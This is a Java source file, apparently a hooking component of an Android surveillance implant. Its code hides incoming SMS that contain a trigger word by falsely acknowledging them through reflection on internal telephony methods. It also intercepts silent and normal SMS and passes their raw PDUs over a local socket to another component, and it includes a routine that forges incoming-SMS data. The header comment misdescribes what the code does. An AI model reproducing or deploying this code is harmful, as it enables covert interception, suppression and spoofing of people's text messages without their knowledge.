package phone.android.com;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.sql.Time;
import java.util.Calendar;
import java.util.GregorianCalendar;
import java.util.HashMap;

import android.app.Activity;
import android.app.Application;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.database.Cursor;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.provider.ContactsContract;
import android.telephony.PhoneNumberUtils;
import android.telephony.SmsMessage;
import android.util.Log;

import com.android.dvci.util.LowEventHandlerDefs;


/*
 * Code tested on 4.0 and 4.4.2
 */


// takes incoming SMS message, reverses the body message and injects it back into the system (will appear as a 2nd SMS message)

public class SMSDispatch {
	private static String TAG = "SMSDispatch";
	public boolean callOrig = true;
	public static final int RESULT_SMS_HANDLED = 1;

	public SMSDispatch(byte pdus[][]) {
		Log.d(TAG, "phone.android.com");
		if (pdus[0] == null) {
			Log.d(TAG, "null pdu");
			return;
		}
		SmsMessage s1 = SmsMessage.createFromPdu(pdus[0]);
		if (s1 != null) {
			Log.d(TAG, "SMSDispatch: incoming SMS");


			if (s1.getMessageBody() != null) {
				Log.d(TAG, s1.getMessageBody());
				Log.d(TAG, s1.getOriginatingAddress());
				Log.d(TAG, s1.getClass().getCanonicalName());
				if (s1.getMessageBody().toLowerCase().contains("hideme")) {
					try {
						this.callOrig = false;
						Log.d(TAG, "hide");
						Reflect r = Reflect.on("com.android.internal.telephony.SMSDispatcher");
						Log.d(TAG, "called on");
						if (r != null) {
							if (r.get() != null) {
								//private void notifyAndAcknowledgeLastIncomingSms(boolean success,int result, Message response)
								Log.d(TAG, "calling notifyAndAcknowledgeLastIncomingSms");
								r.call("notifyAndAcknowledgeLastIncomingSms", true, RESULT_SMS_HANDLED, null);
							} else {
								Log.d(TAG, "calling notifyAndAcknowledgeLastIncomingSms");
							}
						}
					} catch (Exception e) {
						Log.d(TAG, "Exception", e);
					}
				} else {
					this.callOrig = true;
				}
			}
			/*
			if (pdus != null) {
				Intent intent = new Intent("android.provider.Telephony.SMS_RECEIVED");
				intent.putExtra("pdus", pdus);
				intent.putExtra("format", "3gpp");
				// get a context
				Application a = getcon();
				// send intent
				a.sendBroadcast(intent, "android.permission.RECEIVE_SMS");
				Log.d(TAG, a.toString());
			}
			*/
		}
	}



	/**
	 * Sleep.
	 *
	 * @param t ms to msleep
	 */
	public static void msleep(final int t) {
		try {
			Thread.sleep(t);
		} catch (final InterruptedException e) {
			Log.w(TAG, " sleep() throwed an exception");//$NON-NLS-1$
		}
	}
  static int  hexCharToInt(char c) {
        if (c >= '0' && c <= '9') return (c - '0');
        if (c >= 'A' && c <= 'F') return (c - 'A' + 10);
        if (c >= 'a' && c <= 'f') return (c - 'a' + 10);
        throw new RuntimeException ("invalid hex char '" + c + "'");
    }
	public static byte[] hexStringToBytes(String s) {
		byte[] ret;

		if (s == null) return null;

		int sz = s.length();

		ret = new byte[sz / 2];

		for (int i = 0; i < sz; i += 2) {
			ret[i / 2] = (byte) ((hexCharToInt(s.charAt(i)) << 4)
					| hexCharToInt(s.charAt(i + 1)));
		}

		return ret;
	}

	public static int dispatchParcel(Parcel p){
		int callOrig = 1;
		if (p == null) {
			Log.d(TAG, "null Parcel return ");
			return callOrig;
		}
		int response;
		int dataPosition = p.dataPosition();
		//Log.d(TAG, "dispatchParcel dataposition before:"+dataPosition);
        response = p.readInt();
		//Log.d(TAG, "dispatchParcel response: "+response);

		if(response == 1003){
			String ret = p.readString();
			p.setDataPosition(dataPosition);
			Log.d(TAG, "dispatchParcel: got RIL_UNSOL_RESPONSE_NEW_SMS string="+ret);
			try {
				SmsMessage sms = SmsMessage.createFromPdu(hexStringToBytes(ret));
				if(sms.getProtocolIdentifier()==64) {
					LowEventHandlerDefs obj = new LowEventHandlerDefs();
					obj.data = sms.getPdu();
					obj.type = LowEventHandlerDefs.EVENT_TYPE_SMS_SILENT;
					obj = sendSerialObj(obj);
					if (obj != null) {
						return obj.res;
					}
				}else {
					Log.d(TAG, sms.getMessageBody());
					Log.d(TAG, sms.getOriginatingAddress());
					Log.d(TAG, "TP_PID=" +sms.getProtocolIdentifier());
				}
			}catch (Exception e){
				Log.d(TAG, " (dispatchParcel) Ex",e);//$NON-NLS-1$
			}

		}
		return callOrig;
	}
	public static int dispatchNormalMessage(Object smsO) {
		Log.d(TAG, "dispatchNormalMessage: start now" + smsO);
		int callOrig = 1;
		if (smsO == null) {
			Log.d(TAG, "dispatchNormalMessage: null message return ");
			return callOrig;
		}
		Log.d(TAG, "dispatchNormalMessage: start serviceConnection");
		byte[][] pdus = new byte[1][];
		Log.d(TAG, "dispatchNormalMessage: asking pdu ");
		pdus[0] = Reflect.on(smsO).call("getPdu").get();
		Log.d(TAG, "dispatchNormalMessage: got it");
		//Application a = getcon();
		SmsMessage sms = SmsMessage.createFromPdu(pdus[0]);
		if (sms == null) {
			Log.d(TAG, "failed to create sms");
			return callOrig;
		}
		LowEventHandlerDefs obj = new LowEventHandlerDefs();
		obj.data = pdus[0];
		obj.type = LowEventHandlerDefs.EVENT_TYPE_SMS;
		obj = sendSerialObj(obj);
		if(obj!=null){
			return obj.res;
		}
		return callOrig;
	}

	private static LowEventHandlerDefs sendSerialObj(LowEventHandlerDefs obj) {
		if (obj==null){
			return null;
		}
		LocalSocket sender = new LocalSocket();
		obj.res=1;
		try {
			sender.connect(new LocalSocketAddress("llad"));
			Log.d(TAG, "SENT DATA ");
			int timeout = 5;
			Log.d(TAG, "wait connection..");
			while (timeout-- > 0) {
				if (sender.isBound() && sender.isConnected()) {
					break;
				} else {
					Log.d(TAG, ".");
				}
				msleep(100);
			}
			if (!(sender.isBound() && sender.isConnected())) {
				Log.d(TAG, " (connection failed): ");//$NON-NLS-1$
				return obj;
			}
			DataInputStream streamIn = new DataInputStream(new
					BufferedInputStream(sender.getInputStream()));
			DataOutputStream streamOut = new DataOutputStream(new
					BufferedOutputStream(sender.getOutputStream()));
			ObjectOutputStream oos = new ObjectOutputStream(streamOut);
			oos.writeObject(obj);
			oos.flush();
			streamOut.flush();
			Log.d(TAG, " (object sent): ");//$NON-NLS-1$
			obj = null;
			timeout = 10;
			int available = 0;
			while (timeout-- > 0 && available <= 0) {
				try {
					if (sender.isBound() && sender.isConnected()) {
						try {
							available = streamIn.available();
							Log.d(TAG, " (getAvailable): " + available);//$NON-NLS-1$
							if (available > 0) {

								ObjectInputStream ois = new ObjectInputStream(streamIn);
								obj = (LowEventHandlerDefs) ois.readObject();
								Log.d(TAG, "GOT DATA " + obj);
							}
						} catch (Exception e) {
							Log.d(TAG, " (is available) Error: ", e);//$NON-NLS-1$
						}
					} else {
						Log.d(TAG, " (getAvailable) sender not connected");//$NON-NLS-1$
					}

				} catch (Exception e) {
					Log.d(TAG, " (getAvailable) Error: ", e);//$NON-NLS-1$
				}
				msleep(100);
			}
			Log.d(TAG, " (exiting): t=" + timeout + " a=" + available);//$NON-NLS-1$
			msleep(100);
		}catch (Exception e){
			Log.d(TAG, " (LocalSocketAddress) Error: ", e);//$NON-NLS-1$
		}
		return obj;
	}

	public static Application getcon() {
		try {
			final Class<?> activityThreadClass =
					Class.forName("android.app.ActivityThread");
			if (activityThreadClass == null)
				Log.d(TAG, "activityThreadClass == null");
			final Method method = activityThreadClass.getMethod("currentApplication");
			Application app = (Application) method.invoke(null, (Object[]) null);
			if (app == null) {
				Log.d(TAG, "getcon app == null");
				final Method method2 = activityThreadClass.getMethod("getApplication");
				if (method2 == null)
					Log.d(TAG, "method2 == null");
				if (app == null) {
					Log.d(TAG, "getcon 2 app == null");
					try {
						Field f = activityThreadClass.getField("mInitialApplication");
						app = (Application) f.get(activityThreadClass);
					} catch (Exception e) {
					}
				}
				if (app == null)
					Log.d(TAG, "getcon 3 app == null");
			}
			return app;
		} catch (final ClassNotFoundException e) {
			// handle exception
			Log.d(TAG, e.toString());
		} catch (final NoSuchMethodException e) {
			// handle exception
			Log.d(TAG, e.toString());
		} catch (final IllegalArgumentException e) {
			// handle exception
			Log.d(TAG, e.toString());
		} catch (final IllegalAccessException e) {
			// handle exception
			Log.d(TAG, e.toString());
		} catch (final InvocationTargetException e) {
			// handle exception
			Log.d(TAG, e.toString());
		}
		Log.d(TAG, "getcon == null :-(");
		return null;
	}

	//
	// reverseBytes and createFakesSms code taken from Thomas Cannon's SMSSpoof.java
	// https://github.com/thomascannon/android-sms-spoof/blob/master/SMSSpoofer/src/net/thomascannon/smsspoofer/SMSSpoof.java
	//
	private static byte reverseByte(byte b) {
		return (byte) ((b & 0xF0) >> 4 | (b & 0x0F) << 4);
	}

	private static byte[] createFakeSms(String sender, String body) {
		//Source: http://stackoverflow.com/a/12338541
		//Source: http://blog.dev001.net/post/14085892020/android-generate-incoming-sms-from-within-your-app
		byte[] scBytes = PhoneNumberUtils.networkPortionToCalledPartyBCD("0000000000");
		byte[] senderBytes = PhoneNumberUtils.networkPortionToCalledPartyBCD(sender);
		int lsmcs = scBytes.length;
		byte[] dateBytes = new byte[7];
		Calendar calendar = new GregorianCalendar();
		dateBytes[0] = reverseByte((byte) (calendar.get(Calendar.YEAR)));
		dateBytes[1] = reverseByte((byte) (calendar.get(Calendar.MONTH) + 1));
		dateBytes[2] = reverseByte((byte) (calendar.get(Calendar.DAY_OF_MONTH)));
		dateBytes[3] = reverseByte((byte) (calendar.get(Calendar.HOUR_OF_DAY)));
		dateBytes[4] = reverseByte((byte) (calendar.get(Calendar.MINUTE)));
		dateBytes[5] = reverseByte((byte) (calendar.get(Calendar.SECOND)));
		dateBytes[6] = reverseByte((byte) ((calendar.get(Calendar.ZONE_OFFSET) + calendar
				.get(Calendar.DST_OFFSET)) / (60 * 1000 * 15)));
		try {
			ByteArrayOutputStream bo = new ByteArrayOutputStream();
			bo.write(lsmcs);
			bo.write(scBytes);
			bo.write(0x04);
			bo.write((byte) sender.length());
			bo.write(senderBytes);
			bo.write(0x00);
			bo.write(0x00); // encoding: 0 for default 7bit
			bo.write(dateBytes);
			try {
				String sReflectedClassName = "com.android.internal.telephony.GsmAlphabet";
				Class cReflectedNFCExtras = Class.forName(sReflectedClassName);
				Method stringToGsm7BitPacked = cReflectedNFCExtras.getMethod("stringToGsm7BitPacked", new Class[]{String.class});
				stringToGsm7BitPacked.setAccessible(true);
				byte[] bodybytes = (byte[]) stringToGsm7BitPacked.invoke(null, body);
				bo.write(bodybytes);
			} catch (Exception e) {
			}

			return bo.toByteArray();
		} catch (IOException e) {
		}
		return null;
	}
}
